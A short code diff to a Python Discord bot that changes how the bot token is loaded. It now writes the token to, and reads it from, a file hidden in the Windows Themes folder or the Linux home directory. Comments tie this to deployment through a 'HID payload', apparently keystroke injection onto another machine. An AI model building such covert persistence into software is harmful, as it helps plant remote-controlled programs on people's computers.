@@ -13,21 +13,37 @@ intents = discord.Intents.default()
 intents.message_content = True
 
 # Check if it is being used in a HID payload
+user = os.getlogin()
 
-try:
-    if sys.argv[1] == "1":
-        token = sys.argv[2]
-        print(token)
+if platform.system() == "Windows":
+    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\token.txt"
+elif platform.system() == "Linux":
+    path = f"/home/{user}/token.txt"
+
+token_file = os.path.isfile(path)
+
+if len(sys.argv) > 1:
+    print("Args found, writing to file")
+    token = sys.argv[1]
+    f = open(path, "x")
+    f = open(path, "w")
+    f.write(token)
+    f.close()
+
+else:
+    print("No args for token, checking for token file")
+    if token_file == True:
+        print("found token file")
+        f = open(path, "r")
+        file_content = f.read()
+        token = file_content
+        f.close()
     else:
-        print("Not executed with HID payload")
+        print("No token file found, using .env file")
+
         load_dotenv()
 
         token = os.getenv("DISCORD_TOKEN")
-except:
-    print("probably not executed with HID payload")
-    load_dotenv()
-
-    token = os.getenv("DISCORD_TOKEN")
 
 client = discord.Client(intents=intents)
 
